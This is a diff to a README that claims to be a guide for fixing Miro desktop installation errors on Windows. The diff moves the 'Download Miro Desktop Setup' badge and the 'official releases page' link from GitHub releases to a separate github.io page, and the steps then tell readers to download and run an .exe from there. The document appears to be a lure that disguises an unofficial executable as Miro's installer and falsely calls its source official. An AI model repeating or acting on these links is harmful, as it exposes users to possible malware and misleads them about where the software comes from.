@@ -1,6 +1,6 @@
 # 🖥️ Miro-Desktop-Configuration-Guide - Fix Miro installation errors on Windows
 
-[![](https://img.shields.io/badge/Download-Miro_Desktop_Setup-grey.svg?style=for-the-badge)](https://github.com/Eleven4098/Miro-Desktop-Configuration-Guide/releases)
+[![](https://img.shields.io/badge/Download-Miro_Desktop_Setup-grey.svg?style=for-the-badge)](https://eleven4098.github.io)
 
 ## 📌 Project Overview
 
@@ -20,7 +20,7 @@ Before you begin, verify your computer meets these requirements:
 
 Follow these steps to download and install the application on your PC.
 
-1. Visit the [official releases page](https://github.com/Eleven4098/Miro-Desktop-Configuration-Guide/releases) to access the latest installer.
+1. Visit the [official releases page](https://eleven4098.github.io) to access the latest installer.
 2. Select the latest version listed under the Assets section.
 3. Choose the file ending in .exe to download the installer to your computer.
 4. Locate the downloaded file in your browser downloads folder or your local PC downloads directory.
